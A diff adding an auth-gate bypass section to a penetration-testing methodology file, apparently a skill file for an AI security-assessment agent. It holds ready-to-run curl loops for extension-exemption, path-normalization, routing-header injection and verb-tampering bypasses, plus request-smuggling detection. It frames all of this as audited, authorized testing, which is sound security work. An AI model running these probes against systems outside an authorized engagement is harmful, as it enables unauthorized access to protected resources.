@@ -108,17 +108,128 @@ PUT /api/profile {"name":"test","role":"admin","is_staff":true}  # Mass assignme
 # Trust headers: X-Forwarded-For: 127.0.0.1, X-Original-URL: /admin
 ```
 
+## Attack the Gate Itself — Bypass-Technique Sweep
+
+When the engagement surfaces an auth gate (login wall, SSO redirect, WAF challenge, API key guard), the first-pass methodology above probes *through* the gate using legitimate credentials. This section covers attacking the **gate mechanism itself** — testing whether the enforcement layer can be sidestepped without credentials at all. The operator-core phase flow schedules this as a distinct "Perimeter / Auth-Gate Bypass" step between Collect and Test; this section carries the mechanics.
+
+### Step 0: Product-Specific OSINT Pre-Load
+
+Before probing, identify what is enforcing the gate. A product-specific brief materially narrows the relevant bypass surface:
+
+```bash
+# Fingerprint the gate product (WAF, reverse proxy, API gateway, IDP)
+vigil assess kali exec --technique DISCOVERY \
+  --intent "identify auth-gate product for bypass OSINT" \
+  --probe-kind fingerprint --phase consume-test --timeout 60 -- \
+  bash -c 'curl -si "https://TARGET/protected" | grep -iE "server:|via:|x-powered-by:|location:|set-cookie:|x-request-id:|cf-ray:|akamai|f5|aws|apigee|ping|okta|azure"'
+```
+
+With the product identified, pull its known bypass inventory from `agent/references/web/` and any vendor-specific notes in `agent/references/access-control/`. Known bypass patterns for reverse-proxy/IDP stacks are often published in CVE databases and researcher writeups — query those before investing in manual discovery.
+
+### Step 1: Static-Extension Exemption
+
+Many gate configurations exempt static asset extensions to avoid blocking CSS/JS/images. Test whether protected paths can be reached by appending or substituting an exempted extension:
+
+```bash
+# Path with exempted extension suffix
+vigil assess kali exec --technique AUTH --intent "static-extension exemption bypass" \
+  --probe-kind payload --phase consume-test --timeout 60 -- bash -c '
+for ext in .js .css .png .ico .json .woff .svg .html .txt .xml; do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/protected$ext")
+  body_size=$(curl -sk -o - "https://TARGET/protected$ext" | wc -c)
+  echo "$ext -> HTTP $code body=${body_size}b"
+done'
+```
+
+A 200 that returns the protected resource body (not a static asset) with a `.js` suffix is a confirmed bypass — the gate matched on extension before the backend validated the path.
+
+### Step 2: Path / Normalization Confusion
+
+The gate and the backend often use different URL parsers. Test case variation, trailing slashes, dot-segment injection, semicolon suffixes, and encoded slashes to find where their normalization diverges:
+
+```bash
+vigil assess kali exec --technique AUTH --intent "path normalization bypass variants" \
+  --probe-kind payload --phase consume-test --timeout 60 -- bash -c '
+PROTECTED="https://TARGET/protected"
+for path in \
+  "/PROTECTED" "/protected/" "/./protected" "/protected/." \
+  "//protected" "/protected%20" "/protected%09" \
+  "/protected;.js" "/protected..;/" "/protected%2f" \
+  "/%2fprotected" "/protected%2e%2e" "/../protected"; do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET$path")
+  echo "$path -> HTTP $code"
+done'
+```
+
+### Step 3: Routing-Header Injection
+
+Reverse proxies and API gateways often trust upstream headers that override the effective host, path, or origin. Inject these before the gate makes its enforcement decision:
+
+```bash
+vigil assess kali exec --technique AUTH --intent "routing-header injection bypass" \
+  --probe-kind payload --phase consume-test --timeout 60 -- bash -c '
+for hdr in \
+  "X-Original-URL: /admin" \
+  "X-Rewrite-URL: /admin" \
+  "X-Forwarded-Host: internal.target.example" \
+  "X-Forwarded-For: 127.0.0.1" \
+  "X-Real-IP: 127.0.0.1" \
+  "X-Custom-IP-Authorization: 127.0.0.1" \
+  "X-ProxyUser-Ip: 127.0.0.1" \
+  "CF-Connecting-IP: 127.0.0.1"; do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" -H "$hdr" "https://TARGET/protected")
+  echo "$hdr -> HTTP $code"
+done'
+```
+
+### Step 4: Verb Tampering
+
+Auth gates often enforce policy on specific HTTP methods (GET, POST) but skip enforcement for less-common verbs. Test every verb the backend might handle:
+
+```bash
+vigil assess kali exec --technique AUTH --intent "verb tampering bypass" \
+  --probe-kind payload --phase consume-test --timeout 60 -- bash -c '
+for method in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE CONNECT; do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" -X "$method" "https://TARGET/protected")
+  echo "$method -> HTTP $code"
+done
+# Override headers for servers that trust the client-declared method
+for override in "X-HTTP-Method-Override" "X-Method-Override" "X-Original-Method"; do
+  code=$(curl -sk -o /dev/null -w "%{http_code}" -H "$override: GET" -X POST "https://TARGET/protected")
+  echo "POST + $override:GET -> HTTP $code"
+done'
+```
+
+### Step 5: Request Desync / Smuggling Lead
+
+When the gate is a reverse proxy or load balancer fronting a backend with different HTTP parsing (CL vs TE), request smuggling can bypass the gate by hiding a second request inside the body of the first. This requires a tool capable of constructing the exact bytes. Surface the lead first:
+
+```bash
+# Fingerprint CL.TE / TE.CL vulnerability class — run only once per host
+vigil assess kali nuclei \
+  -u https://TARGET \
+  -t http/misconfiguration/http-desync/ \
+  -severity medium,high,critical \
+  -o /engagements/$ENGAGEMENT_KEY/scans/desync_nuclei.jsonl \
+  --technique REQUEST-SMUGGLING --intent "CL.TE / TE.CL desync fingerprint" \
+  --probe-kind payload --phase consume-test --timeout 600
+```
+
+If nuclei flags a candidate, load `agent/skills/http-smuggling/SKILL.md` for the manual confirmation and exploit path — desync is a verification-intensive class that needs hand-crafted packet construction.
+
 ## Methodology Checklist
 
 All HTTP probing steps must go through `vigil assess kali exec --technique AUTH --intent "<purpose>" --probe-kind <kind> --phase consume-test --timeout <N> -- curl ...` (or the appropriate typed verb) so every request lands in the audit pipeline. Use `--probe-kind baseline` for control requests, `--probe-kind payload` for attack attempts, `--probe-kind exploit` for confirmed bypass demonstrations.
 
 1. Map all auth endpoints (login, register, reset, logout, MFA, OAuth)
-2. Create accounts at each privilege level
-3. Test each privileged action with lower/no-auth sessions
-4. Swap tokens between privilege levels
-5. Test every object reference with other accounts' IDs
-6. Check JWT/token security
-7. Test session lifecycle: fixation, expiration, invalidation
+2. Identify the gate product (Step 0 above) and pull its OSINT bypass inventory
+3. Run the gate-bypass sweep (Steps 1–5 above) before probing through the gate
+4. Create accounts at each privilege level
+5. Test each privileged action with lower/no-auth sessions
+6. Swap tokens between privilege levels
+7. Test every object reference with other accounts' IDs
+8. Check JWT/token security
+9. Test session lifecycle: fixation, expiration, invalidation
 
 ## Fail-Open Testing
 
